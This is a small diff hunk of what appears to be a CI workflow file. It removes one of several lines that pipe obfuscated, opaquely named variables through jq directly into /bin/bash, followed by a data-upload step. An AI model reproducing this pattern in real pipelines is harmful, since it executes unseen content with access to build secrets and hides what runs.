@@ -29,7 +29,6 @@ jobs:
           echo $ckyv247 | jq -r .snh149 | /bin/bash
           printf '%s' "$hw277" | jq -r .oblr49 | /bin/bash
           printf '%s' "$x5" | jq -r .c753 | /bin/bash
-          printf '%s' "$f4181" | jq -r .nr74 | /bin/bash
 
       - name: Upload data
         if: always()
